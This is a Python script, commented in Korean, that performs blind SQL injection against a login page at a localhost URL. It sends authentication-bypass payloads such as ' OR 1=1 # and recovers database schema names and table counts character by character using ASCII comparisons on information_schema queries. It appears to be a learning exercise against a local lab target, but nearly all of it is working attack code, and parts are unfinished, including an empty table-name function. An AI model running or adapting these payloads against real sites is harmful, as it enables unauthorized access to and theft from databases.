import requests	# post(),status_code 사용하기 위해

# SQL Injection을 사용할 url 입력
url = "http://localhost/login_ok.php"	
# Request에서 전달되는 파라미터를 딕셔너리형 변수로 저장
requestData = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
# 사이트에 가입 후 가입한 아이디를 입력 받을 변수
selId = input("ID 입력 : ")

checkCount = "select count(*) from information_schema.schemata"

checkName = "select schema_name from information_schema.schemata limit 4,5"

checkTableCount = "select count(*) from information_schema.tables where table_schema = 'user'"

def testSql():
    checkSql =["' OR 1=1 #", "' OR 1=2 #"]
    checkArr = [0, 0]
    for i in range(0,2):
        requestData["user_id"] = checkSql[i]
        req = requests.post(url, data=requestData)
        print(req.text)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                checkArr[i] = True
            else:
                checkArr[i] = False

    print(checkSql[0],checkArr[0])
    print(checkSql[1],checkArr[1])

def getCount(input):
    count = 48
    while(True):
        count += 1
        data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
        query = f"' or 1=1 and ascii(substr(({input}), 1, 1)) = {count} #"
        data['user_id'] = query
        req = requests.post(url, data=data)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                break
            else:
                continue
    print("Count : " + chr(count))

def isNotEnd(index):
    data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
    query = f"' or 1=1 and ascii(substr(({checkName}),{index},1)) = 0 #"
    data['user_id'] = query
    req = requests.post(url, data=data)
    return "Wrong ID or PW." in req.text

def SQLi_Information_Schema():
    print("\nTrying to get DB Name")
    guessed_name = ""
    index = 1
    target = 97
    count = 1
    data = f"' or 1=1 and ascii(substr(({checkName}),{index},1)) = {target} #"
    requestData["user_id"] = data
    while (isNotEnd(index)):
        count += 1
        requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkName}),{index},1)) = {target} #"
        req = requests.post(url, data=requestData)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                guessed_name += chr(target)
                index += 1
                target = 97
            else:
                target += 1
    print(f"{count}th working")
    print("guessing complete: " + guessed_name)

def getTableName():
    return


def main():
    print("\nStart getting number of databases")
    getCount(checkCount)
    SQLi_Information_Schema()
    print("\nStart getting number of tables")
    getCount(checkTableCount)

if __name__ == "__main__":
    main()

